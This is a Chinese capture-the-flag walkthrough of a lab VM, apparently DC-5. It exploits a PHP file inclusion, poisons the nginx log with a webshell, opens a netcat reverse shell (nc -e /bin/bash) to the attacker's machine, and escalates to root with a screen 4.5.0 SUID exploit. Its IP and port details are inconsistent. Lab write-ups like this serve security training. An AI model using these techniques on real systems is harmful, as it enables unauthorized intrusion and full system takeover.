下载环境导入靶机，在kali里面扫描靶机ip地址![1641786125_61dbab0dec6005ec75f52.png!small](https://image.3001.net/images/20220110/1641786125_61dbab0dec6005ec75f52.png!small)靶机IP：192.168.190.133

扫描端口：![1641786174_61dbab3e44d0353a9eeaa.png!small](https://image.3001.net/images/20220110/1641786174_61dbab3e44d0353a9eeaa.png!small)开放了两个tcp端口，我们访问一下ip![1641786223_61dbab6f71a1135ca6a0a.png!small](https://image.3001.net/images/20220110/1641786223_61dbab6f71a1135ca6a0a.png!small)在下载靶机的时候说明了只有一个flag，我们在页面试试，发现contact页面评论后会出现thankyou.php![1641786349_61dbabed5bcbe1e67121c.png!small](https://image.3001.net/images/20220110/1641786349_61dbabed5bcbe1e67121c.png!small)而且每次刷新下方的显示不同，扫描一下后台![1641786489_61dbac795c32d88b31c47.png!small](https://image.3001.net/images/20220110/1641786489_61dbac795c32d88b31c47.png!small)访问footer.php![1641786540_61dbacac61372ac493c1d.png!small](https://image.3001.net/images/20220110/1641786540_61dbacac61372ac493c1d.png!small)同样是每次刷新后内容不同，那猜测下方的年份显示可能是调用文件后返回的数值，尝试一下文件包含，发现成功文件包含![1641786681_61dbad39931d45a82e4b6.png!small](https://image.3001.net/images/20220110/1641786681_61dbad39931d45a82e4b6.png!small)因为靶机服务扫描时发现靶机网站使用的是nginx服务器，我们知道nginx服务器的默认配置文件是`/etc/nginx/nginx.conf`，所以将nginx的配置文件包含过来查看日志路径，发现了nginx的日志路径:
access_log /var/log/nginx/access.log; error_log
/var/log/nginx/error.log;![1641786868_61dbadf4201171071deb8.png!small](https://image.3001.net/images/20220110/1641786868_61dbadf4201171071deb8.png!small)向日志文件传输一句话木马让其进行解析，使用burpsuite抓包改包向日志文件传入一句话木马![1641786915_61dbae2354356f4e63cd3.png!small](https://image.3001.net/images/20220110/1641786915_61dbae2354356f4e63cd3.png!small)使用蚁剑连接![1641787063_61dbaeb78051cff41c81b.png!small](https://image.3001.net/images/20220110/1641787063_61dbaeb78051cff41c81b.png!small)![1641787091_61dbaed3ddada88e6a561.png!small](https://image.3001.net/images/20220110/1641787091_61dbaed3ddada88e6a561.png!small)使用虚拟终端反弹shell，蚁剑虚拟终端输入nc
-e /bin/bash 192.168.190.133(kali ip地址) 777，kali监听7777
端口![1641787259_61dbaf7bc8e0c4f7e5838.png!small](https://image.3001.net/images/20220110/1641787259_61dbaf7bc8e0c4f7e5838.png!small)

切换shell外壳

    
    
    python -c 'import pty;pty.spawn("/bin/bash")'

然后进行提权，使用命令`find / -user root -perm -4000 -print 2>/dev/null`，查看是否有可利用的suid

![1641787585_61dbb0c1121d8f7ae0669.png!small](https://image.3001.net/images/20220110/1641787585_61dbb0c1121d8f7ae0669.png!small)这里不知道哪个有用就看了大佬们的wp，发现screen-4.5.0有漏洞可以利用，使用命令：`searchsploit
screen
4.5.0`![1641787851_61dbb1cb44d9821a6565e.png!small](https://image.3001.net/images/20220110/1641787851_61dbb1cb44d9821a6565e.png!small)将文件cp出来![1641788008_61dbb268041bf5e7a6983.png!small](https://image.3001.net/images/20220110/1641788008_61dbb268041bf5e7a6983.png!small)41154.sh：![1641788152_61dbb2f89e2ffb077bd4a.png!small](https://image.3001.net/images/20220110/1641788152_61dbb2f89e2ffb077bd4a.png!small)查看文件可以知道，脚本文件需要分3个步骤完成  
第一步：将第一部分diam写入libhax.c文件中，在执行相应的命令生成libhax.so文件![1641788251_61dbb35b9ef28d54441e5.png!small](https://image.3001.net/images/20220110/1641788251_61dbb35b9ef28d54441e5.png!small)![1641788270_61dbb36edb52a724971f3.png!small](https://image.3001.net/images/20220110/1641788270_61dbb36edb52a724971f3.png!small)第二步：将第二部分的C语言代码写入rootshell文件中，并编译成rooshell文件![1641788321_61dbb3a17466bd1dfb375.png!small](https://image.3001.net/images/20220110/1641788321_61dbb3a17466bd1dfb375.png!small)第三步：将剩下部分的脚本代码写入到dc5.sh文件中，在开头加上`#!/bin/bash`注明执行环境，保存需要输入为`set
ff=unix`，是为了防止脚本的格式错误![1641788395_61dbb3ebf3b9aff63ba4c.png!small](https://image.3001.net/images/20220110/1641788395_61dbb3ebf3b9aff63ba4c.png!small)查看dc5.sh文件并加上可执行权限![1641788489_61dbb449dc97f71543e17.png!small](https://image.3001.net/images/20220110/1641788489_61dbb449dc97f71543e17.png!small)将生成的三个文件通过蚁剑上传到根目录下的/tmp/下![1641788600_61dbb4b87c9378026cdbb.png!small](https://image.3001.net/images/20220110/1641788600_61dbb4b87c9378026cdbb.png!small)然后在反弹shell中使用命令执行dc5.sh文件，命令`chmod
+x
dc5.sh`增加可执行权限，执行文件![1641788682_61dbb50a35d691f7214eb.png!small](https://image.3001.net/images/20220110/1641788682_61dbb50a35d691f7214eb.png!small)查看权限：![1641788718_61dbb52e1012e3bc343ef.png!small](https://image.3001.net/images/20220110/1641788718_61dbb52e1012e3bc343ef.png!small)切换到/root下拿到flag：![1641788765_61dbb55db4838a15fae42.png!small](https://image.3001.net/images/20220110/1641788765_61dbb55db4838a15fae42.png!small)

